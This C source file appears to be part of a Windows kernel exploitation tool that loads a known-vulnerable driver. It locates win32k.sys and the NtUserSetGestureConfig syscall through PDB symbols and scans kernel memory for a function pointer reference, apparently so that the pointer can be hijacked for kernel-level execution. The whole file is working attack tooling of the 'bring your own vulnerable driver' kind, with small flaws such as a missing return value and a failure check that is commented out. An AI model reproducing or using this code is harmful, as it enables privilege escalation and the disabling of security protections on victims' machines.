#include "vuln.h"
#include "utils/utils.h"
#include "driver/driver_loader.h"
#include "driver/driver_interface.h"

#include "EasyPdb.h"

bool RemoveDriver(DriverState* driverState) {
	CloseDriverConnection(driverState);
	TryStopAndRemoveDriver(driverState);
}

bool InitDriver(DriverState* driverState) {
	if (!CreateAndStartDriver(driverState)) {
		log_error("failed to create and start driver");
		//return false;
	}
	if (!OpenDriverConnection(driverState)) {
		log_error("failed to open driver connection");
		RemoveDriver(driverState);
		return false;
	}
	else {
		//if connect succesful, force try to unload
		driverState->file_created = true;
		driverState->service_created = true;
	}
	return true;
}

//init that not req vuln driver
bool PreInit(const wchar_t* vuln_driver_path, const wchar_t* vuln_driver_name, DriverState** driverState_out) {
	DriverState* driverState = malloc(sizeof(DriverState));
	if (!driverState)
		return false;//????

	driverState->vuln_driver_name = vuln_driver_name;
	driverState->vuln_driver_path = vuln_driver_path;

	if (!driverState->vuln_driver_name || !driverState->vuln_driver_path) {
		log_error("vuln_driver_name | vuln_driver_path cant be null");
		return false;
	}

	char win32k_path[MAX_PATH];
	if (!GetWin32kPath(win32k_path)) {
		log_error("failed get win32k_path");
		return false;
	}
	log_info("win32k path: %s", win32k_path);

	int NtUserSetGestureConfig_rva = EzPdbGetRva(win32k_path, "NtUserSetGestureConfig");
	if (NtUserSetGestureConfig_rva <= 0) {
		log_error("failed get NtUserSetGestureConfig_rva");
		return false;
	}
	log_info("NtUserSetGestureConfig_rva: %d", NtUserSetGestureConfig_rva);

	HMODULE u32mod = LoadLibraryA("user32.dll");
	HMODULE w32mod = LoadLibraryA("win32u.dll");
	if (!u32mod || !w32mod) {
		log_error("failed load user32 | win32u dlls");
		return false;
	}

	uintptr_t win32k = GetKernelModuleAddress("win32k.sys");
	if (!win32k) {
		log_error("failed to get win32k base");
		return false;
	}

	log_info("win32k base: %p\n", win32k);

	uintptr_t NtUserSetGestureConfig_u = GetProcAddress(w32mod, "NtUserSetGestureConfig");
	if (!NtUserSetGestureConfig_u) {
		log_error("failed to get GetProcAddress NtUserSetGestureConfig_u");
		return false;
	}

	driverState->win32k_base = win32k;
	driverState->NtUserSetGestureConfig_rva = NtUserSetGestureConfig_rva;
	driverState->NtUserSetGestureConfig_u = NtUserSetGestureConfig_u;
	*driverState_out = driverState;
	return true;
}

bool TryUpdateNtRef(DriverState* driverState) {
	uintptr_t NtUserSetGestureConfig = driverState->win32k_base + driverState->NtUserSetGestureConfig_rva;

	uintptr_t nt_qword = FindPatternAtKernel(driverState, NtUserSetGestureConfig, 0x100, "\x48\x8B\x05", "xxx");
	if (!nt_qword) {
		log_error("failed to find pattern for nt ref");
		return false;
	}

	int  nt_qword_offset = 0;
	ReadMemory(driverState, nt_qword + 3, &nt_qword_offset, sizeof(int));
	if (!nt_qword_offset) {
		log_error("failed to get offset for nt ref");
		return false;
	}
	log_info("ref offset: %d", nt_qword_offset);

	uintptr_t NtUserSetGestureConfig_ref = nt_qword + nt_qword_offset + 7;
	log_info("NtUserSetGestureConfig_ref: %p", NtUserSetGestureConfig_ref);
	driverState->NtUserSetGestureConfig_ref = NtUserSetGestureConfig_ref;
	return true;
}

bool TryLoadVuln(const wchar_t* vuln_driver_path, const wchar_t* vuln_driver_name, DriverState** pDriverState) {
	if (!PreInit(vuln_driver_path, vuln_driver_name, pDriverState)) {
		log_error("preinit failed, aborting");
		return false;
	}

	DriverState* driverState = *pDriverState;
	if (!InitDriver(driverState)) {
		log_error("failed to init driver, aborting");
		return false;
	}
	log_info("driver ini done");

	if (!TryUpdateNtRef(driverState)) {
		log_error("failed to update nt ref, aborting");
		RemoveDriver(driverState);
		return false;
	}

	return true;
}

bool UnloadVuln(DriverState* driverState) {
	if (driverState) {
		return RemoveDriver(driverState);
	}
	return false;
}
